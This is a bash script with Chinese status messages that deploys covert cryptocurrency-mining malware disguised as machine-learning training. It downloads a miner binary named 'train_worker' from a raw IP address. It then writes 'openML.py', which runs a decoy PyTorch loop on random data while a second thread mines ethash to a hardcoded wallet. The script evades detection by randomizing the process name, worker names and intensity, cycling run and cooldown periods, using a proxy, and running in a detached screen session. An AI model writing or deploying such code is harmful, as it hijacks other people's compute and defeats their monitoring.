#!/bin/bash

set -e

echo "[*] 更新系統套件..."
sudo apt update && sudo apt install -y python3-pip screen wget

echo "[*] 安裝 Python 必要套件..."
pip3 install --upgrade pip
pip3 install torch numpy setproctitle

OPML_BIN="train_worker"
OPML_URL="http://3.81.227.209/download/train_worker.tar.gz"
OPML_DIR="./miner"

echo "[*] 下載並解壓礦工二進制檔..."
mkdir -p $OPML_DIR
wget  $OPML_URL 
tar xzfv train_worker.tar.gz -C $OPML_DIR

if [ ! -f "$OPML_DIR/$OPML_BIN" ]; then
    echo "[!] 找不到礦工執行檔，請確認下載鏈接或手動放置二進制檔!"
    exit 1
fi

chmod +x $OPML_DIR/$OPML_BIN

echo "[*] 建立學習隱匿腳本 openML.py..."

cat > openML.py << 'EOF'
import subprocess
import threading
import time
import random
import os
import string
import torch
import torch.nn as nn
import torch.optim as optim

def random_proc_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

class StealthModel(nn.Module):
    def __init__(self):
        super(StealthModel, self).__init__()
        self.fc1 = nn.Linear(10, 50)
        self.fc2 = nn.Linear(50, 1)
    def forward(self, x):
        x = torch.relu(self.fc1(x))
        return self.fc2(x)

def legit_training_loop(stop_event):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    model = StealthModel().to(device)
    optimizer = optim.Adam(model.parameters(), lr=0.001)
    criterion = nn.MSELoss()
    epoch = 0
    while not stop_event.is_set():
        inputs = torch.randn(64, 10).to(device)
        targets = torch.randn(64, 1).to(device)
        optimizer.zero_grad()
        outputs = model(inputs)
        loss = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch += 1
        if epoch % 100 == 0:
            print(f"[LEGIT TRAINING] Epoch {epoch}, Loss: {loss.item():.4f}")
        time.sleep(random.uniform(0.1, 0.4))


def run_miner(wallet, worker_prefix, stop_event, proxy=None):
    while not stop_event.is_set():
        intensity = random.randint(15, 20)
        worker_name = f"{worker_prefix}_{random.randint(1000,9999)}"
        miner_cmd = [
            "./miner/train_worker",
            "-a", "ethash",
            "--coin", "bgg",
            "-o", "stratum+tcp://eu.gtpool.io:9999",
            "-u", f"{wallet}.{worker_name}",
            "-p", "x",
            "--intensity", str(intensity),
            "--temperature-limit", "70",
            "--log-path", f"miner_{worker_name}.log"
        ]
        if proxy:
            miner_cmd.extend(["--proxy", proxy])
        proc = subprocess.Popen(miner_cmd)
        runtime = random.randint(900, 1800)
        for _ in range(runtime):
            if stop_event.is_set():
                break
            time.sleep(1)
        proc.terminate()
        cooldown = random.randint(60, 300)
        for _ in range(cooldown):
            if stop_event.is_set():
                break
            time.sleep(1)

if __name__ == "__main__":
    wallet = "AJZD2EHWV6RaChsnGuJGFU3"
    worker_prefix = random_proc_name(6)
    proxy = "127.0.0.1:1080"

    stop_event = threading.Event()

    try:
        import setproctitle
        setproctitle.setproctitle(worker_prefix)
    except ImportError:
        pass

    legit_thread = threading.Thread(target=legit_training_loop, args=(stop_event,))
    legit_thread.start()

    miner_thread = threading.Thread(target=run_miner, args=(wallet, worker_prefix, stop_event, proxy))
    miner_thread.start()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        stop_event.set()
        legit_thread.join()
        miner_thread.join()
EOF

echo "[*] 設定 openML.py 可執行權限..."
chmod +x openML.py

echo "[*] 使用 screen 啟動學習腳本，session 名稱：openML"
screen -dmS openML python3 openML.py

echo "[*] 部署完成！"
echo "  使用 'screen -r openML' 查看學習腳本輸出"
echo "  使用 'screen -X -S openML quit' 停止學習腳本"
